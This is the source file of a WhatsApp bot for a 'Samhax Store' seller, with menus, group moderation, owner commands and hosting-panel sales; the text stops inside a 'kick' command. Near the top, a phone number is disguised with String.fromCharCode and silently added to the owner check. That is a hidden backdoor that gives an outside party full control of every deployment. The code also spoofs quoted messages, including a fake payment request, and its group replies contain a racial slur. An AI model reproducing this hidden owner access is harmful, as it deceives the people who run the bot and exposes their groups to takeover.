/*

  !- Credits By SamhaxStore
  https://wa.me/923287573267
 
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)
require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = `.`
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgRed.bold(botname2), chalk.yellow.bold(`[ PESAN ]`), chalk.yellow.bold(`${m.sender.split("@")[0]} =>`), chalk.green.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "samhax store"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "INR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Yare yare,My Lord is *Busy*, 
Say what do u want from him! 
The Owner is currently detached from the system , State your purpose with precision. I am listening.🧊
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|open thislinktojoinwhatsappgroup/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Group Link Detected*

@${m.sender.split("@")[0]} Yare Yare , Your message is deleted nigga because lord samhax has activated the anti-link feature for nigga's like you!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|open thislinktojoinwhatsappgroup/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Group Link Detected*

@${m.sender.split("@")[0]} Yare Yare , Your message is deleted nigga because lord samhax has activated the anti-link feature for nigga's like you!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

conn.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await conn.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await conn.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await conn.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "allmenu": case "menu": case "debraj": {
  let teks = `
Yoo @${m.sender.split("@")[0]},
*Welcome to 𝙎𝙖𝙢𝙝𝙖𝙭 𝙎𝙩𝙤𝙧𝙚*
*What do you like to buy or wanna contact owner*

┏╍╍╍ ⟬ USER INFORMATION ⟭ ╍╍𖥏
┇ ✒ ɴᴀᴍᴇ : @${m.sender.split("@")[0]}
┇ ✒ ɴᴜᴍʙᴇʀ : ${m.sender.split('@')[0]}
┇ ✒ sᴛᴀᴛᴜs: *${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free"}*
╠╍╍╍⚘ ⟬ BOT INFORMATION ⟭ ╍╍ᖫ
┇❖ʙᴏᴛ ɴᴀᴍᴇ: *${global.botname2}*  
┇❖ᴠᴇʀꜱɪᴏɴ : ${global.versi}
┇❖ᴅᴇᴠᴇʟᴏᴘᴇʀ: *${global.namaOwner}*  
┇❖ᴍᴏᴅᴇ: *${conn.public ? "Public" : "Self"}* 
┗╍╍╍╍「𖦹」╍╍𖤣╍╍ 「⇪」╍╍╍╍𖥏
`;

  await conn.sendMessage(m.chat, {
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📜 Select the menu you want',
            sections: [
              {
                title: `𝐅𝐑𝐄𝐐𝐔𝐄𝐍𝐓𝐋𝐘 𝐔𝐒𝐄𝐃 𝐌𝐄𝐍𝐔𝐒`,
                highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
                rows: [
                  {
                    title: 'STORE MENU',
                    id: '.panelmenu'
                    },
                  ]},
                  {
                title: `OTHER MENU`,
                highlight_label: ``,
                rows: [
                  {
                    title: '📌SAMHAX MENU',
                    id: '.ownermenu'
                  },
                  {
                    title: '⚔️GROUP MENU',
                    id: '.grupmenu'
                  },
                  {
                    title: '💣OTHER MENU',
                    id: '.othermenu'
                  },
                  {
                    title: '📞CONTACT SAMHAX',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    caption: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true,
      },
    },
  });
}
break;
case "ownermenu": {
  const teks = `
┏╍╍╍ ⟬ BOT INFORMATION ⟭ ╍╍
┇❖ʙᴏᴛ ɴᴀᴍᴇ: *${global.botname2}*  
┇❖ᴠᴇʀꜱɪᴏɴ : ${global.versi}
┇❖ᴅᴇᴠᴇʟᴏᴘᴇʀ: *${global.namaOwner}*  
┇❖ᴍᴏᴅᴇ: *${conn.public ? "Public" : "Self"}* 
┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍
┏─❖ *LORD SAMHAX MENU* ❖
┃📜 public
┃📜 self
┃📜 addowner
┃📜 delowner
┃📜 listowner
┃📜 addseller
┃📜 delseller
┃📜 listseller
┗────────────❖`;

  await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📜 Select the menu you want',
            sections: [
              {
                title: `𝐅𝐑𝐄𝐐𝐔𝐄𝐍𝐓𝐋𝐘 𝐔𝐒𝐄𝐃 𝐌𝐄𝐍𝐔𝐒`,
                highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
                rows: [
                  {
                    title: 'STORE MENU',
                    id: '.panelmenu'
                    },
                  ]},
                  {
                title: `OTHER MENU`,
                highlight_label: ``,
                rows: [
                  {
                    title: '📌SAMHAX MENU',
                    id: '.ownermenu'
                  },
                  {
                    title: '⚔️GROUP MENU',
                    id: '.grupmenu'
                  },
                  {
                    title: '💣OTHER MENU',
                    id: '.othermenu'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
case "grupmenu": {
  const teks = `
┏╍╍╍⚘ ⟬ BOT INFORMATION ⟭ ╍╍ᖫ
┇❖ʙᴏᴛ ɴᴀᴍᴇ: *${global.botname2}*  
┇❖ᴠᴇʀꜱɪᴏɴ : ${global.versi}
┇❖ᴅᴇᴠᴇʟᴏᴘᴇʀ: *${global.namaOwner}*  
┇❖ᴍᴏᴅᴇ: *${conn.public ? "Public" : "Self"}* 
┗╍╍╍╍「𖦹」╍╍𖤣╍╍ 「⇪」╍╍╍╍𖥏  
┏─❖ *GROUP MENU* ❖
┃📜 close
┃📜 open
┃📜 hidetag
┃📜 promote 
┃📜 demote
┃📜 kick
┃📜 tagall 
┃📜 spamtag
┃📜 linkgc
┗────────────❖`;

  await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📜 Select the menu you want',
            sections: [
              {
                title: `𝐅𝐑𝐄𝐐𝐔𝐄𝐍𝐓𝐋𝐘 𝐔𝐒𝐄𝐃 𝐌𝐄𝐍𝐔𝐒`,
                highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
                rows: [
                  {
                    title: 'STORE MENU',
                    id: '.panelmenu'
                    },
                  ]},
                  {
                title: `OTHER MENUS`,
                highlight_label: ``,
                rows: [
                  {
                    title: '📌SAMHAX MENU',
                    id: '.ownermenu'
                  },
                  {
                    title: '⚔️GROUP MENU',
                    id: '.grupmenu'
                  },
                  {
                    title: '💣OTHER MENU',
                    id: '.othermenu'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
case "othermenu": {
  const teks = `
┏╍╍╍⚘ ⟬BOT INFORMATION ⟭ ╍╍ᖫ
┇❖ʙᴏᴛ ɴᴀᴍᴇ: *${global.botname2}*  
┇❖ᴠᴇʀꜱɪᴏɴ : ${global.versi}
┇❖ᴅᴇᴠᴇʟᴏᴘᴇʀ: *${global.namaOwner}*  
┇❖ᴍᴏᴅᴇ: *${conn.public ? "Public" : "Self"}* 
┗╍╍╍╍「𖦹」╍╍𖤣╍╍ 「⇪」╍╍╍╍𖥏  

┏──❖ *OTHER MENU* ❖
┃📜 ping
┃📜 brat
┃📜 bratvid
┃📜 cekidch
┃📜 vv
┗────────────❖`;

  await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📜 Select the menu you want',
            sections: [
              {
                title: `𝐅𝐑𝐄𝐐𝐔𝐄𝐍𝐓𝐋𝐘 𝐔𝐒𝐄𝐃 𝐌𝐄𝐍𝐔𝐒`,
                highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
                rows: [
                  {
                    title: 'STORE MENU',
                    id: '.panelmenu'
                    },
                  ]},
                  {
                title: `OTHER MENU`,
                highlight_label: ``,
                rows: [
                  {
                    title: '📌SAMHAX MENU',
                    id: '.ownermenu'
                  },
                  {
                    title: '⚔️GROUP MENU',
                    id: '.grupmenu'
                  },
                  {
                    title: '💣OTHER MENU',
                    id: '.othermenu'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
case "panelmenu": {
  const teks = `
┏╍╍╍⚘ ⟬ BOT INFORMATION ⟭ ╍╍ᖫ
┇❖ʙᴏᴛ ɴᴀᴍᴇ: *${global.botname2}*  
┇❖ᴠᴇʀꜱɪᴏɴ : ${global.versi}
┇❖ᴅᴇᴠᴇʟᴏᴘᴇʀ: *${global.namaOwner}*  
┇❖ᴍᴏᴅᴇ: *${conn.public ? "Public" : "Self"}* 
┗╍╍╍╍「𖦹」╍╍𖤣╍╍ 「⇪」╍╍╍╍𖥏  
┏─❖ *SAMHAX STORE MENU* ❖
┃📜 .addseller
┃📜 .delseller
┃📜 .listseller
┃📜 .cpanel-v1
┃📜 .cpanel-v2
┃📜 .cpanel-v3
┗────────────❖`;

await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📂 Select the Cpanel Menu',
            sections: [
              {
                title: `MENU Store CPANEL`,
                highlight_label: '',
                rows: [
                  {
                    title: 'Samhax Store Menu',
                    id: '.cpanel-v1'
                  },
                  {
                    title: 'Levantor Store Menu',
                    id: '.cpanel-v2'
                  },
                  {
                    title: 'Boruto Store Menu',
                    id: '.cpanel-v3'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
case "cpanel-v1": {
  const teks = `
┏─❖ *Samhax store CPANEL* ❖
┃📜 .1gb
┃📜 .2gb
┃📜 .3gb
┃📜 .4gb
┃📜 .5gb
┃📜 .6gb
┃📜 .7gb
┃📜 .8gb
┃📜 .9gb
┃📜 .10gb
┃📜 .unlimited
┃📜 .cadmin
┃📜 .delpanel
┃📜 .deladmin
┃📜 .listpanel
┃📜 .listadmin
┗────────────❖`;

 await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📂 Select the Cpanel Menu',
            sections: [
              {
                title: 'MENU CPANEL',
                highlight_label: 'Populer',
                rows: [
                  {
                    title: 'Samhax Store Menu',
                    id: '.cpanel-v1'
                  },
                  {
                    title: 'Levantor Store Menu',
                    id: '.cpanel-v2'
                  },
                  {
                    title: 'Boruto Store Menu',
                    id: '.cpanel-v3'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
case "cpanel-v2": {
  const teks = `
┏─❖ *levantor store Cpanel* ❖
┃📜 .1gb-v2
┃📜 .2gb-v2
┃📜 .3gb-v2
┃📜 .4gb-v2
┃📜 .5gb-v2
┃📜 .6gb-v2
┃📜 .7gb-v2
┃📜 .8gb-v2
┃📜 .9gb-v2
┃📜 .10gb-v2
┃📜 .unlimited-v2
┃📜 .cadmin-v2
┃📜 .delpanel-v2
┃📜 .deladmin-v2
┃📜 .listpanel-v2
┃📜 .listadmin-v2
┗────────────❖`;
await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📂 Select the Cpanel Menu',
            sections: [
              {
                title: 'MENU CPANEL',
                highlight_label: 'Populer',
                rows: [
                  {
                    title: 'Samhax Store Menu',
                    id: '.cpanel-v1'
                  },
                  {
                    title: 'Levantor Store Menu',
                    id: '.cpanel-v2'
                  },
                  {
                    title: 'Boruto Store Menu',
                    id: '.cpanel-v3'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
case "cpanel-v3": {
  const teks = `
┏─❖ *Boruto Store Panel* ❖
┃📜 .1gb-v3
┃📜 .2gb-v3
┃📜 .3gb-v3
┃📜 .4gb-v3
┃📜 .5gb-v3
┃📜 .6gb-v3
┃📜 .7gb-v3
┃📜 .8gbv3
┃📜 .9gb-v3
┃📜 .10gb-v3
┃📜 .unlimited-v3
┃📜 .cadmin-v3
┃📜 .delpanel-v3
┃📜 .deladmin-v3
┃📜 .listpanel-v3
┃📜 .listadmin-v3
┗────────────❖`;
await conn.sendMessage(m.chat, {
    caption: teks,
    document: fs.readFileSync("./package.json"),
    fileName: `Posted by ${namaOwner}`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 10_000_000,
    headerType: 1,
    footer: `© ${new Date().getFullYear()} ${botname}`,
    buttons: [
      {
        buttonId: `.owner`,
        buttonText: { displayText: '👤 Contact Lord' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '📋 View Options' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '📂 Select the Cpanel Menu',
            sections: [
              {
                title: 'MENU CPANEL',
                highlight_label: 'Populer',
                rows: [
                  {
                    title: 'Samhax store Menu',
                    id: '.cpanel-v1'
                  },
                  {
                    title: 'Levantor store Menu',
                    id: '.cpanel-v2'
                  },
                  {
                    title: 'Boruto store Menu',
                    id: '.cpanel-v3'
                  },
                  {
                    title: '📞CONTACT OWNER',
                    id: '.owner'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idSaluran,
        newsletterName: global.namaSaluran
      },
      externalAdReply: {
        title: `${botname} v${versi}`,
        body: `⏱️ Active for: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break

//=============================//
case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("Yare yare... you want to be my master? 🤔 Prove it: send your number to my lord. 👑"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`NUMBER ${input2} IS ALREADY AN OWNER, NO NEED TO ASK FOR ADD-ONS!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Welcome aboard. ✅ Now that my lord has your number, I may address me as a Master?`)
}
case "kick": case "kik": {
